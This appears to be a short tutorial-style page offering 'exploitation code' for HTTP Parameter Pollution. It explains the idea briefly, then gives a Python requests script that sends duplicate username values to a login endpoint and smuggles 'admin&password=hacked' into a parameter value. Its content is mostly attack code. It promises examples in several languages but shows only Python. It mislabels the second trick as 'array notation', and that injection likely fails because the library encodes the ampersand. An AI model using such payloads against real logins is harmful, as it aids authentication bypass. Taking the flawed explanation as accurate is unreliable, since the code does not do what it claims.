# HTTP Parameter Pollution (HPP) Exploitation Code

HTTP Parameter Pollution (HPP) occurs when multiple HTTP parameters with the same name are sent to a server, which may lead to bypassing input validation or WAF rules. Here are examples in different languages to demonstrate HPP attacks:

## Python (using requests library)

```python
import requests

# Target URL with vulnerable parameter
url = "https://example.com/login"

# Normal request
params = {
    'username': 'admin',
    'password': 'password123'
}

# HPP attack by sending duplicate parameters
hpp_params = {
    'username': ['admin', 'hacker'],  # Duplicate username parameter
    'password': 'password123'
}

# Send the request with HPP
response = requests.get(url, params=hpp_params)
print("Response with HPP:", response.text)

# Another HPP technique - using array notation
hpp_params2 = {
    'username': 'admin&password=hacked',
    'password': 'password123'
}
response2 = requests.get(url, params=hpp_params2)
print("Response with array notation HPP:", response2.text)
```

